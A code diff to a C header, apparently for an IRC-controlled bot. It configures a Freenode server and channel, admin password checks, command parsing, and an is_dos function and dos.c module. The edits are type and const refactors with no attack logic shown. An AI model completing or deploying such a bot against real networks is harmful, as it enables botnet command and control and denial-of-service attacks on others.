@@ -55,7 +55,7 @@
  */
 #define SERVER     "irc.freenode.net"   // IRC server
 #define PORT       "6667"           // server port
-#define CHANNEL    "#uuiiafa"       // channel name
+#define CHANNEL    "#nullbyte"       // channel name
 //#define U_NAME     "JSchmoeBot"     // username
 //#define N_NAME     "JSchmoeBot"     // nickname
 #define IRC_PWORD  NULL             // password for nickname
@@ -95,7 +95,7 @@
  * to WIN32's SOCKET typedef
  * and linux's file descriptor
  */
-typedef unsigned int SOCKET;
+typedef int SOCKET;
 
 #endif
 
@@ -124,13 +124,13 @@ typedef struct _account {
 typedef struct _message {
     char n_name[MAX_NAME];          // nickname
     char *contact;                  // channel/privmsg
-    int contactSize;
+    unsigned short contactSize;
     char *command;                  // command
-    int commandSize;
+    unsigned short commandSize;
     char *param;                    // command [parameter]
-    int paramSize;
+    unsigned short paramSize;
     char *msg;                      // entire message
-    int msgSize;
+    unsigned short msgSize;
 } Message, *pMessage;
 
 typedef struct _thr_args {
@@ -259,7 +259,7 @@ void fatal (char *);
 // init.c
 pAccount new_account (void);
 pMessage new_message (void);
-SOCKET server_connect (char *, char *);
+SOCKET server_connect (const char *, const char *);
 int setup_irc (SOCKET, pAccount);
 void str_to_lower (char *);
 void format_message (pMessage);
@@ -269,10 +269,10 @@ int cleanup (SOCKET, pAccount, pMessage);
 void start_recv (SOCKET, pAccount);
 
 // exec.c
-int check_pass (char *);
+int check_pass (const char *);
 int add_admin (pAccount, pMessage);
 bool is_admin (pAccount, pMessage);
-bool is_dos (char *);
+bool is_dos (const char *);
 int parse_args (SOCKET, pMessage);
 
 // dos.c
